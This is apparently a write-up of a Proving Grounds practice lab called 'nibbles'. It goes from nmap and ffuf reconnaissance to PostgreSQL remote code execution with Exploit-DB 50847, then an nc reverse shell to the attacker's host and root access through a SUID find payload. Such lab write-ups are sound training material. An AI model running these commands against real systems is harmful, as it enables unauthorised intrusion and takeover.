<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.53.47 -p- -v -T4 

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/nibbles]
└─$ sudo nmap -A 192.168.53.47 -T4  -v -p-
[sudo] password for bl4ck4non: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 05:43 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating Ping Scan at 05:43
Scanning 192.168.53.47 [4 ports]
Completed Ping Scan at 05:43, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:43
Completed Parallel DNS resolution of 1 host. at 05:43, 0.04s elapsed
Initiating SYN Stealth Scan at 05:43
Scanning 192.168.53.47 [65535 ports]
Discovered open port 80/tcp on 192.168.53.47
Discovered open port 21/tcp on 192.168.53.47
Discovered open port 22/tcp on 192.168.53.47
SYN Stealth Scan Timing: About 2.18% done; ETC: 06:07 (0:23:13 remaining)
SYN Stealth Scan Timing: About 15.73% done; ETC: 05:50 (0:05:27 remaining)
SYN Stealth Scan Timing: About 32.75% done; ETC: 05:48 (0:03:07 remaining)
SYN Stealth Scan Timing: About 42.58% done; ETC: 05:48 (0:02:43 remaining)
SYN Stealth Scan Timing: About 63.62% done; ETC: 05:47 (0:01:26 remaining)
Discovered open port 5437/tcp on 192.168.53.47
SYN Stealth Scan Timing: About 85.73% done; ETC: 05:47 (0:00:30 remaining)
Completed SYN Stealth Scan at 05:47, 212.75s elapsed (65535 total ports)
Initiating Service scan at 05:47
Scanning 4 services on 192.168.53.47
Completed Service scan at 05:47, 11.29s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.53.47
Retrying OS detection (try #2) against 192.168.53.47
Initiating Traceroute at 05:47
Completed Traceroute at 05:47, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 05:47
Completed Parallel DNS resolution of 2 hosts. at 05:47, 0.01s elapsed
NSE: Script scanning 192.168.53.47.
Initiating NSE at 05:47
Completed NSE at 05:47, 5.12s elapsed
Initiating NSE at 05:47
Completed NSE at 05:47, 3.11s elapsed
Initiating NSE at 05:47
Completed NSE at 05:47, 0.00s elapsed
Nmap scan report for 192.168.53.47
Host is up (0.18s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10621ff522de29d42496a766c364b710 (RSA)
|   256 c915ffcdf397ec3913164838c558d75f (ECDSA)
|_  256 907ca34473b4b44ce39c71d187baca7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b0866d304913684e16c18348fc76fe43
|_SHA-1: cb3051090fc114ab0fb98e5558744bb5ba5766af
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), Linux 2.6.35 (87%), Linux 4.9 (87%), Linux 3.5 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 8.441 days (since Wed Feb 22 19:13:22 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   203.05 ms 192.168.49.1
2   203.07 ms 192.168.53.47

NSE: Script Post-scanning.
Initiating NSE at 05:47
Completed NSE at 05:47, 0.00s elapsed
Initiating NSE at 05:47
Completed NSE at 05:47, 0.00s elapsed
Initiating NSE at 05:47
Completed NSE at 05:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 238.63 seconds
           Raw packets sent: 131291 (5.780MB) | Rcvd: 183 (8.116KB)

```
From our scan we have 4 open ports. Port 21 which runs ftp, port 22 which runs ssh, port 80 which runs http and port 5437 which runs postgresql. So, our enumeration will be focused on port 80, port 5437 and maybe port 21 (this is because anonymous login isn't allowed)




<h2>Enumeration Port 80</h2>

Visiting the webpage gives you this

![image](https://user-images.githubusercontent.com/67879936/222634605-cc5062f1-3a4d-40b7-8930-9642e21ac5e6.png)

Lets fire up our directory searching tool

>command: ffuf -u "http://192.168.53.47/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/nibbles]
└─$ ffuf -u "http://192.168.53.47/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.53.47/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 1272, Words: 178, Lines: 30, Duration: 133ms]
index.html              [Status: 200, Size: 1272, Words: 178, Lines: 30, Duration: 148ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 128ms]
:: Progress: [32298/32298] :: Job [1/1] :: 269 req/sec :: Duration: [0:02:17] :: Errors: 0 ::

```
oops, we there's nothing lool. Lets move on to the next port



<h2>Enumeration Port 5437</h2>

This is a postgresql service. From our scan we get the version

```
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b0866d304913684e16c18348fc76fe43
|_SHA-1: cb3051090fc114ab0fb98e5558744bb5ba5766af

```
There is an available exploit for this version ```PostgreSQL DB 11.3 - 11.9```

![image](https://user-images.githubusercontent.com/67879936/222636400-72550c51-aabc-4cff-8750-0293054d6131.png)

nice, lets go ahead and exploit this vulnerability




<h2>Exploitation Port 5437</h2>

Link to Exploit:https://www.exploit-db.com/exploits/50847

Download this exploit to your machine. 

If you've done that lets exploit hehe


>command: python 50847.py -i 192.168.53.47 -p 5437 -c whoami

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/nibbles]
└─$ python 50847.py -i 192.168.53.47 -p 5437 -c whoami

[+] Connecting to PostgreSQL Database on 192.168.53.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _740a5da3dccd0aa98def3a31763d31ec
[+] Command executed

postgres

[+] Deleting table _740a5da3dccd0aa98def3a31763d31ec
```
cool, our command got executed successfully. As you can see from the above screenshot we have user ```postgres```. Lets put our reverse shell so we can get a shell back on our machine

payload used:```nc -c sh 192.168.49.53 80```

Be sure to change the IP address to your IP address

>command: python 50847.py -i 192.168.53.47 -p 5437 -c "nc -c sh 192.168.49.53 80"

Before running this ensure you set up your netcat listener

>command: rlwrap nc -nvlp 80

![image](https://user-images.githubusercontent.com/67879936/222638501-bd4e0d4a-0cff-4525-90e7-41c98342b4b2.png)

cool, we got a reverse shell as user  ```postgres```. 

To stabilize your shell,

```
python3 -c "import  pty;pty.spawn('/bin/bash')"
Ctrl + z (To background)
stty raw -echo;fg
export TERM=xterm
```

![image](https://user-images.githubusercontent.com/67879936/222639376-915a0b82-82ce-4660-92e4-fcce2664630c.png)


Now, lets go ahead and escalate our privileges




<h3>Privilege Escalation</h3>

Checking the suid binaries available on the machine

>command: find / -perm -u=s  -type f 2>/dev/null

![image](https://user-images.githubusercontent.com/67879936/222640902-801816d6-a904-4726-b733-eff4c62be9c8.png)

we can use the ```/usr/bin/find``` to escalate our privileges

We'll be using gtfobins to pick the payload

Link:https://gtfobins.github.io/

payload:```find . -exec /bin/sh -p \; -quit```

![image](https://user-images.githubusercontent.com/67879936/222645473-0f93d139-27bb-4b14-842f-bf181d5a447c.png)

Boom!!! We got a shell as the root user

That will be all for today

























































